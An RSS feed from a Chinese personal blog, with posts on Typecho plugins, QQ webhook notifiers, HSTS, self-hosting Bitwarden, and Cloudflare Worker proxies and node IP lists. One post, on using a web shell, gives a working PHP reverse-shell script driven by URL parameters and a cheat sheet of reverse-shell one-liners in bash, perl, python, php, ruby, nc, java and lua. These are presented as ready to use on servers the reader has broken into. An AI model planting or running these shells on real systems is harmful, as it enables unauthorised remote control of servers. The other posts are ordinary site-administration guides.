<?xml version="1.0" encoding="UTF-8"?>
<rdf:RDF
xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
xmlns="http://purl.org/rss/1.0/"
xmlns:dc="http://purl.org/dc/elements/1.1/">
<channel rdf:about="https://2890.ltd/feed/rss/category/%E5%B0%B1%E5%9C%A8.html">
<title>OKYes!个人博客 - 建站狂魔</title>
<link>https://2890.ltd/category/就在.html</link>
<description></description>
<items>
<rdf:Seq>
<rdf:li resource="https://2890.ltd/blog/optimize-your-typecho-writing-experience.html"/>
<rdf:li resource="https://2890.ltd/blog/how-to-push-your-comments-and-articles-to-qq-1.html"/>
<rdf:li resource="https://2890.ltd/blog/10-minutes-for-your-website-to-say-goodbye-to-the-black-hole.html"/>
<rdf:li resource="https://2890.ltd/blog/how-to-use-your-webshell-iii-gracefully.html"/>
<rdf:li resource="https://2890.ltd/blog/three-hours-after-liver-explosion-airdropping-v20-was-completed.html"/>
<rdf:li resource="https://2890.ltd/blog/110.html"/>
<rdf:li resource="https://2890.ltd/blog/89.html"/>
<rdf:li resource="https://2890.ltd/blog/59.html"/>
<rdf:li resource="https://2890.ltd/blog/55.html"/>
<rdf:li resource="https://2890.ltd/blog/47.html"/>
</rdf:Seq>
</items>
</channel>
<item rdf:about="https://2890.ltd/blog/optimize-your-typecho-writing-experience.html">
<title>优化你的Typecho写作体验</title>
<link>https://2890.ltd/blog/optimize-your-typecho-writing-experience.html</link>
<dc:date>2020-07-12T23:21:00+08:00</dc:date>
<description>前段时间，我有一个朋友发文吐槽Typecho的前段时间，我有一个朋友发文吐槽Typecho的a种不好    
        
        
            
        
    案发现场其实,Typecho的写作体验也可以很优秀（如果你要使用手机写作当我没说）本文主要介绍如何优化Web端写作体验（电脑）正文因为我的朋友首先吐槽的是Typecho的传图系统（当然还可以嫖又拍云，用插件上传）总所周知，博客最主要的功能就是写作，而Typecho写作太麻烦了。要是我纯写作还好，但一旦想配图就头疼了，即使我用markdown语法也觉得麻烦，图片必须通过链接的方式，这样一搞我就得把图片上传到图床上，可是我如果用公共图床我又怕随时挂掉，可是私人的呢……作为一个敏感型消费者，算了告辞。这里其实可以使用Typecho的插件来解决，无需去记住繁杂的Markdown语法，只需要一个插件——Editor.md就可以解决。文末会放所有插件的下载链接如果需要传图也很简单，只需要将图放在剪贴板，然后粘贴在Editor.md的写作区域内，就像这样
      
      还有Typecho的生态问题，其实不难发现，Typecho有很多优秀的插件散落在各地，有些在GitHub，有些在原作者博客，当然，有人把这些插件收集了起来，如 泽泽社长就做了这样的收集。还有Typecho的社区，虽然小众，但是仍然有不少开发者为这个精简的程序作出贡献下载链接Editor.md又拍云上传插件UpyunFile由于我找不到出处了，就不提供下载了</description>
</item>
<item rdf:about="https://2890.ltd/blog/how-to-push-your-comments-and-articles-to-qq-1.html">
<title>如何将你的评论和文章推送至QQ</title>
<link>https://2890.ltd/blog/how-to-push-your-comments-and-articles-to-qq-1.html</link>
<dc:date>2020-04-10T09:04:00+08:00</dc:date>
<description>是这样的，前几天，我有一个朋友问我QQ的WebHook机器人怎么监控评论，新东西网上根本没现成的，没办法只能自己上了    
        
        
            
        
    明明我也不会写插件啊成品Comment2QQ插件与Posts2QQ插件下载地址在文末已知BUGPosts2QQ会把草稿误判为文章（Typecho开发板貌似不会）如何使用下载两个插件，分别命名为Comment2QQ和Posts2QQ放在Typecho插件目录新建一个QQ群，将2854196399拉入群中，点击机器人，    
        
        
            
        
    打开推送消息点击推送消息    
        
        
            
        
    点击生成，然后复制你的WebHook地址    
        
        
            
        
    最后把WebHook地址放进插件里（Posts2QQ是放在Plugins.php中）下载地址

Comment2QQ


Posts2QQ
此处内容需要评论回复后方可阅读来我群摸鱼啊群号:574985501</description>
</item>
<item rdf:about="https://2890.ltd/blog/10-minutes-for-your-website-to-say-goodbye-to-the-black-hole.html">
<title>10分钟，0经费让你的网站告别黑洞</title>
<link>https://2890.ltd/blog/10-minutes-for-your-website-to-say-goodbye-to-the-black-hole.html</link>
<dc:date>2020-03-26T11:02:00+08:00</dc:date>
<description>做网站，被打已经是家常便饭了，可是每次被打，无防的阿里云、腾讯云的最低级的VPS一碰就死，几乎没有挣扎的余地，但是我们可以通过GitHub、Coding等等HTML托管服务（Pages服务）来让你的网站有一个全量镜像。成品效果感谢夜杏提供HTML单页此处内容需要评论回复后方可阅读此处内容需要评论回复后方可阅读此处内容需要评论回复后方可阅读现在存在的问题不支持Pio插件不支持Mirages的PJAX不支持Typecho原生评论（废话）如何制作使用之前请粗略的了解Git的使用方法，本人只讲原理，不贴图（懒）首先，注册一个GitHub或Coding账户，开一个新的Repo（GItHub命名请命名为Yourname.github.io）使用SSH keygen创建一个新的ssh公钥，上传到Coding或者Github然后使用crontab制作一个计划任务，ssh脚本为此处内容需要评论回复后方可阅读此处内容需要评论回复后方可阅读使用代码之前请在你的网站目录初始化Git使用git init，然后 git remote add origin Git 仓库ssh地址然后git pull origin master拉取一次远程仓库，然后就可以执行脚本了。执行脚本后，你的网站就会被部署到Coding或Github上（Coding需要使用DevOps仓库并且在部署中打开静态Pages）</description>
</item>
<item rdf:about="https://2890.ltd/blog/how-to-use-your-webshell-iii-gracefully.html">
<title>如何优雅的使用你的WebShell III</title>
<link>https://2890.ltd/blog/how-to-use-your-webshell-iii-gracefully.html</link>
<dc:date>2020-03-03T11:50:00+08:00</dc:date>
<description>本文主要讲只猫的使用，That's Netcat什么是NetCATNetCAT是tcp链接工具，本文主要用他来反弹ShellPHP搭配Netcat反弹Shell话不多说，直接上代码&lt;?php

set_time_limit(0);

$ip=$_GET['ip'];

$port=$_GET['port'];

$fp=@fsockopen($ip,$port,$errno,$errstr);

if(!$fp){ echo &quot;error&quot;;}

else{

fputs($fp,&quot;\n++++++++++connect success++++++++\n&quot;);

while (!feof($fp)) {

fputs($fp,&quot;shell:&quot;);//输出

$shell=fgets($fp);

$message=`$shell`;

fputs($fp,$message);

}

fclose($fp);

}

?&gt;访问文件名?ip=ip&port=端口然后shell就弹出来了部分机器不是标准Shell，所以还要进行下一步操作当然，如果可以执行其他语言，这里有NC反弹汇总#bash版本：
bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1

#perl版本:
perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'

#python版本：
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'

#php版本：
php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'

#ruby版本：
ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'

#nc版本：
nc -e /bin/sh 10.0.0.1 1234

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f

nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999

#java版本
r = Runtime.getRuntime()
p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
p.waitFor()

#lua
lua -e &quot;require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');&quot;这样子的话你99%可以获得一个正常Shell了</description>
</item>
<item rdf:about="https://2890.ltd/blog/three-hours-after-liver-explosion-airdropping-v20-was-completed.html">
<title>爆肝三小时，完成了AirDropping V2.0</title>
<link>https://2890.ltd/blog/three-hours-after-liver-explosion-airdropping-v20-was-completed.html</link>
<dc:date>2020-03-01T21:53:00+08:00</dc:date>
<description>今天闲的没事干，看到我以前那个死慢的AirDropping（还丑）给翻新了下遇到的麻烦第一个肯定是宝塔PHP7.2装不了MongoDB扩展，这就很难受，我很少用Mysql的，平常项目都是MongoDB，最后在这里找到了靠谱的解决方案第二个是自己作，把Composer的镜像换成了Aliyun的，然后莫名404了，最后去Composer官网换回了默认源为啥看到这个LOGO就想笑使用方法同原文章，只是大改了UI，大改了上传策略用户协议不能使用此工具上传违法大陆法律的文件作者定时清除云中缓存（不小于30天），请及时下载文件使用该程序默认为同意该条款</description>
</item>
<item rdf:about="https://2890.ltd/blog/110.html">
<title>如何给自己的网站添加HSTS</title>
<link>https://2890.ltd/blog/110.html</link>
<dc:date>2020-02-28T15:00:27+08:00</dc:date>
<description>什么是HSTSHSTS("HTTP Strict Transport Security” HTTP严格安全传输）是一种响应头，像这样Strict-Transport-Security: max-age=31536000; includeSubDomains; preload;他可以防止你的网站在第一次http请求中被劫持，导致无法正常访问。本来我想图方便，直接让七牛将HSTS部署在他的边缘节点上，然后去面板里逛了一圈，发现这面板里没有这个设置，甚至连tls允许版本都没有，明明隔壁又拍云都有(小声bb)。没办法，联系客服也只能做到开HSTS，而且怎么整都只有30天于是，只能自己动手了这里我们主要说Nginx的配置，只需要给nginx添加一行headers规则就好了在nginx.conf末尾添加add_header Strict-Transport-Security &quot;max-age=31536000; includeSubdomains; preload&quot;;max-age代表缓存HSTS头的时间，这里是一年（以秒为单位）includeSubdomains代表为子域名开启HSTSpreload代表预加载到浏览器缓存申请Preload List有HSTS头已经能很大程度上的避免被劫持，但是缺点是需要正常访问一次才能缓存HSTS头，如何做到不需要访问一次，让浏览器自动强制使用HTTPS呢？当然，是有的，Preload list是一个由 Google Chrome 维护，Chrome、Firefox、Safari、IE 11 和 Microsoft Edge 都在遵从的HSTS域名列表如果要想把自己的域名加进这个列表，首先需要满足以下条件：拥有合法的证书（如果使用 SHA-1 证书，过期时间必须早于 2016 年）；

    将所有 HTTP 流量重定向到 HTTPS；

    确保所有子域名都启用了 HTTPS；

    输出 HSTS 响应头：

        max-age 不能低于 18 周（10886400 秒）；

        必须指定 includeSubdomains 参数；

        必须指定 preload 参数；
如果全部都已经完成了的话，就可以去HSTS Preload List申请，但是周期可能会很长，因为是人工审核，目前本站也在申请中，成功了的话我会回来更新文章，写写经验</description>
</item>
<item rdf:about="https://2890.ltd/blog/89.html">
<title>个人介绍页上线</title>
<link>https://2890.ltd/blog/89.html</link>
<dc:date>2020-02-25T15:15:44+08:00</dc:date>
<description>本来一直有个介绍页的，只不过懒得改最近阿里云万网开放了个免费注册姓名.网址，我就去整了几个留着备用，今天英语课闲的没事，又花了一节课上线了我的个人介绍页传送门这个单页其实早在几年前就仿好了，但是一直懒得拿出来用，最终还是用上了233据说中文域名在qq wx里不识别，所以t.im真是个好东西</description>
</item>
<item rdf:about="https://2890.ltd/blog/59.html">
<title>挖坑埋密码？密码存贮程序Bitwarden初体验</title>
<link>https://2890.ltd/blog/59.html</link>
<dc:date>2020-01-16T14:03:04+08:00</dc:date>
<description>这是一款开源的密码服务器，在密码学中有一个原则，只要你的密钥没有被泄露，那么你的数据就是安全的，无论过程是否众所周知。安装体验官方BitWarden是基于.Net 部署，使用MSSQL过于臃肿，于是我并没有使用官方版本，去年在社区中有几位朋友使用Rust将他重写了，项目名为BitWarden_rs，使用SQLite作为数据库，提供Docker部署方案,而且可以免费使用官方一些付费的应用，本篇使用BitWarden_rs作为演示安装Docker#安装Docker
yum -y install docker
#启动docker
systemctl start docker
#开机自启
systemctl enable docker使用Docker拉取BitWarden_rs镜像并运行docker pull bitwardenrs/server:latest
docker run -d --name bitwarden -v /bw-data/:/data/ -p 8848:80 bitwardenrs/server:latest配置反向代理建议使用宝塔面板进行反向代理配置，使用Freessl获取一个免费的亚洲诚信SSL证书（BitWarden需要SSL才能工作）反向代理配置如下#PROXY-START/
location  ~* \.(php|jsp|cgi|asp|aspx)$
{
    proxy_pass http://你的IP:8848;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header REMOTE-HOST $remote_addr;
}
location /
{
    proxy_pass http://你的IP:8848;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header REMOTE-HOST $remote_addr;

    add_header X-Cache $upstream_cache_status;
    
    #Set Nginx Cache
    
        add_header Cache-Control no-cache;
}

#PROXY-END/ENJOY</description>
</item>
<item rdf:about="https://2890.ltd/blog/55.html">
<title>如何充分使用CloudFlare的免费账户</title>
<link>https://2890.ltd/blog/55.html</link>
<dc:date>2020-01-01T00:00:00+08:00</dc:date>
<description>想必各位朋友如果做网站，肯定接触或者听说过CloudFlare这个名词吧，今天我们就来看看怎么把CF免费账户的价值榨干1. 使用CF workers进行反向代理，搭建博客大家应该都知道，CF出了一个worker服务，可以让你免费运行serverless代码，比如制作反向代理，搭建博客等，只要能用node.js实现理论都可以运行，每日免费请求量是20万，够一个小型站点一天使用了。源码1.反代
/**
 * static files (404.html, sw.js, conf.js)
 */
const ASSET_URL = '要访问的地址'

const JS_VER = 10
const MAX_RETRY = 1

/** @type {RequestInit} */
const PREFLIGHT_INIT = {
  status: 204,
  headers: new Headers({
    'access-control-allow-origin': '*',
    'access-control-allow-methods': 'GET,POST,PUT,PATCH,TRACE,DELETE,HEAD,OPTIONS',
    'access-control-max-age': '1728000',
  }),
}

/**
 * @param {any} body
 * @param {number} status
 * @param {Object&lt;string, string&gt;} headers
 */
function makeRes(body, status = 200, headers = {}) {
  headers['--ver'] = JS_VER
  headers['access-control-allow-origin'] = '*'
  return new Response(body, {status, headers})
}


/**
 * @param {string} urlStr 
 */
function newUrl(urlStr) {
  try {
    return new URL(urlStr)
  } catch (err) {
    return null
  }
}


addEventListener('fetch', e =&gt; {
  const ret = fetchHandler(e)
    .catch(err =&gt; makeRes('cfworker error:\n' + err.stack, 502))
  e.respondWith(ret)
})


/**
 * @param {FetchEvent} e 
 */
async function fetchHandler(e) {
  const req = e.request
  const urlStr = req.url
  const urlObj = new URL(urlStr)
  const path = urlObj.href.substr(urlObj.origin.length)

  if (urlObj.protocol === 'http:') {
    urlObj.protocol = 'https:'
    return makeRes('', 301, {
      'strict-transport-security': 'max-age=99999999; includeSubDomains; preload',
      'location': urlObj.href,
    })
  }

  if (path.startsWith('/http/')) {
    return httpHandler(req, path.substr(6))
  }

  switch (path) {
  case '/http':
    return makeRes('请更新 cfworker 到最新版本!')
  case '/ws':
    return makeRes('not support', 400)
  case '/works':
    return makeRes('it works')
  default:
    // static files
    return fetch(ASSET_URL + path)
  }
}


/**
 * @param {Request} req
 * @param {string} pathname
 */
function httpHandler(req, pathname) {
  const reqHdrRaw = req.headers
  if (reqHdrRaw.has('x-jsproxy')) {
    return Response.error()
  }

  // preflight
  if (req.method === 'OPTIONS' &amp;&amp;
      reqHdrRaw.has('access-control-request-headers')
  ) {
    return new Response(null, PREFLIGHT_INIT)
  }

  let acehOld = false
  let rawSvr = ''
  let rawLen = ''
  let rawEtag = ''

  const reqHdrNew = new Headers(reqHdrRaw)
  reqHdrNew.set('x-jsproxy', '1')

  // 此处逻辑和 http-dec-req-hdr.lua 大致相同
  // https://github.com/EtherDream/jsproxy/blob/master/lua/http-dec-req-hdr.lua
  const refer = reqHdrNew.get('referer')
  const query = refer.substr(refer.indexOf('?') + 1)
  if (!query) {
    return makeRes('missing params', 403)
  }
  const param = new URLSearchParams(query)

  for (const [k, v] of Object.entries(param)) {
    if (k.substr(0, 2) === '--') {
      // 系统信息
      switch (k.substr(2)) {
      case 'aceh':
        acehOld = true
        break
      case 'raw-info':
        [rawSvr, rawLen, rawEtag] = v.split('|')
        break
      }
    } else {
      // 还原 HTTP 请求头
      if (v) {
        reqHdrNew.set(k, v)
      } else {
        reqHdrNew.delete(k)
      }
    }
  }
  if (!param.has('referer')) {
    reqHdrNew.delete('referer')
  }

  // cfworker 会把路径中的 `//` 合并成 `/`
  const urlStr = pathname.replace(/^(https?):\/+/, '$1://')
  const urlObj = newUrl(urlStr)
  if (!urlObj) {
    return makeRes('invalid proxy url: ' + urlStr, 403)
  }

  /** @type {RequestInit} */
  const reqInit = {
    method: req.method,
    headers: reqHdrNew,
    redirect: 'manual',
  }
  if (req.method === 'POST') {
    reqInit.body = req.body
  }
  return proxy(urlObj, reqInit, acehOld, rawLen, 0)
}


/**
 * 
 * @param {URL} urlObj 
 * @param {RequestInit} reqInit 
 * @param {number} retryTimes 
 */
async function proxy(urlObj, reqInit, acehOld, rawLen, retryTimes) {
  const res = await fetch(urlObj.href, reqInit)
  const resHdrOld = res.headers
  const resHdrNew = new Headers(resHdrOld)

  let expose = '*'
  
  for (const [k, v] of resHdrOld.entries()) {
    if (k === 'access-control-allow-origin' ||
        k === 'access-control-expose-headers' ||
        k === 'location' ||
        k === 'set-cookie'
    ) {
      const x = '--' + k
      resHdrNew.set(x, v)
      if (acehOld) {
        expose = expose + ',' + x
      }
      resHdrNew.delete(k)
    }
    else if (acehOld &amp;&amp;
      k !== 'cache-control' &amp;&amp;
      k !== 'content-language' &amp;&amp;
      k !== 'content-type' &amp;&amp;
      k !== 'expires' &amp;&amp;
      k !== 'last-modified' &amp;&amp;
      k !== 'pragma'
    ) {
      expose = expose + ',' + k
    }
  }

  if (acehOld) {
    expose = expose + ',--s'
    resHdrNew.set('--t', '1')
  }

  // verify
  if (rawLen) {
    const newLen = resHdrOld.get('content-length') || ''
    const badLen = (rawLen !== newLen)

    if (badLen) {
      if (retryTimes &lt; MAX_RETRY) {
        urlObj = await parseYtVideoRedir(urlObj, newLen, res)
        if (urlObj) {
          return proxy(urlObj, reqInit, acehOld, rawLen, retryTimes + 1)
        }
      }
      return makeRes(res.body, 400, {
        '--error': `bad len: ${newLen}, except: ${rawLen}`,
        'access-control-expose-headers': '--error',
      })
    }

    if (retryTimes &gt; 1) {
      resHdrNew.set('--retry', retryTimes)
    }
  }

  let status = res.status

  resHdrNew.set('access-control-expose-headers', expose)
  resHdrNew.set('access-control-allow-origin', '*')
  resHdrNew.set('--s', status)
  resHdrNew.set('--ver', JS_VER)

  resHdrNew.delete('content-security-policy')
  resHdrNew.delete('content-security-policy-report-only')
  resHdrNew.delete('clear-site-data')

  if (status === 301 ||
      status === 302 ||
      status === 303 ||
      status === 307 ||
      status === 308
  ) {
    status = status + 10
  }

  return new Response(res.body, {
    status,
    headers: resHdrNew,
  })
}


/**
 * @param {URL} urlObj 
 */
function isYtUrl(urlObj) {
  return (
    urlObj.host.endsWith('.googlevideo.com') &amp;&amp;
    urlObj.pathname.startsWith('/videoplayback')
  )
}

/**
 * @param {URL} urlObj 
 * @param {number} newLen 
 * @param {Response} res 
 */
async function parseYtVideoRedir(urlObj, newLen, res) {
  if (newLen &gt; 2000) {
    return null
  }
  if (!isYtUrl(urlObj)) {
    return null
  }
  try {
    const data = await res.text()
    urlObj = new URL(data)
  } catch (err) {
    return null
  }
  if (!isYtUrl(urlObj)) {
    return null
  }
  return urlObj
}![]()2.博客源代码GayHub上一堆，不发了2. 手动指定cf节点ip来达到最佳cdn效果此操作使用于用CloudFlare Partner接入的用户添加网站之后，通过A记录解析到这些IP：108.162.236.1/24 联通 走美国
172.64.32.1/24 移动 走香港
104.16.160.1/24 电信 走美国洛杉矶
---------
172.64.0.0/24 电信 美国旧金山
104.20.157.0/24 联通 走日本
104.28.14.0/24 移动 走新加坡
 （联通移动推荐节点）
 104.23.240.0-104.23.243.254
 （电信推荐百度云合作ip）
 162.159.208.4-162.159.208.103
 162.159.209.4-162.159.209.103
 162.159.210.4-162.159.210.103
 162.159.211.4-162.159.211.103速度快的：104.20.157.2 
104.18.62.2 
141.101.115.3 
104.16.160.3百度云加速合作节点：162.159.211.4-103
103.21.244.0/22
103.22.200.0/22
103.31.4.0/22
104.16.0.0/12
108.162.192.0/18
131.0.72.0/22
141.101.64.0/18
162.158.0.0/15
172.64.0.0/13
173.245.48.0/20
188.114.96.0/20
190.93.240.0/20
197.234.240.0/22
198.41.128.0/17其余节点#适合电信的节点
104.23.240.*
#走欧洲各国出口 英国德国荷兰等 延迟比美国高一些 适合源站在欧洲的网站
172.64.32.*
#虽然去程走新加坡，但是回程线路的绕路的，实际效果不好，不推荐
104.16.160.*
#圣何塞的线路，比洛杉矶要快一点，推荐
108.162.236.*
#亚特兰大线路，延迟稳定，但是延迟较高
#适合移动的节点
162.158.133.* 
#走的丹麦，这一段ip只有部分能用，可以自己试一下。绕美国。
198.41.214.*
198.41.212.*
198.41.208.*
198.41.209.*
172.64.32.*
141.101.115.*
#移动走香港的IP段有很多，以上并不是全部。CF移动走香港的分直连和走ntt的效果都挺不错的，不过部分地区晚上还是会丢包。
172.64.0. *
#这是走圣何塞的，一般用香港的就行
172.64.16.* 
#欧洲线路.绕
 #1.0.0.1效果较好
电信部分
大多数省直接使用1.0.0.0即可，延迟低，丢包少，
 #移动部分
#新加坡
 104.18.48.0-104.18.63.255
104.24.112.0-104.24.127.255
104.27.128.0-104.27.143.255
104.28.0.0-104.28.15.255
 #移动部分
#圣何塞 
104.28.16.0-31.255
104.27.144.0-243.254
104.23.240.0-243.254
 #香港cloudflare1-100g.hkix.net
1.0.0.0-254
1.1.1.0-254
 #香港直连
104.16.0.0-79.255
104.16.96.0-175.254
104.16.192.0-207.255</description>
</item>
<item rdf:about="https://2890.ltd/blog/47.html">
<title>0成本搭建超快的Serverless Blog</title>
<link>https://2890.ltd/blog/47.html</link>
<dc:date>2019-11-27T20:20:00+08:00</dc:date>
<description>用过很多博客程序了，有动态的，也有静态的，只能说各有所长吧。今天这个程序，基于serverless，运行在cloudflare workers上，除了域名需要付费(也可以去Freenom申请免费的，但是不推荐)其余都是完全免费的。演示源代码github 这份代码是未经修改的，你也可以选择自行修改搭建过程进入cloudflare官网，登录你的账号进入workers设置，创建一个新的worker点击editor，将worker.js内容粘贴到左边，save，就完事了自定义域名获取到自己的**.workers.dev 域名 Cname 到(**.workers.dev)然后去 Workers 点击 ADD route输入自定义域名，例如 iloli.icu/* 后面要加上 /* ，下面的 workers 选择刚才的项目</description>
</item>
</rdf:RDF>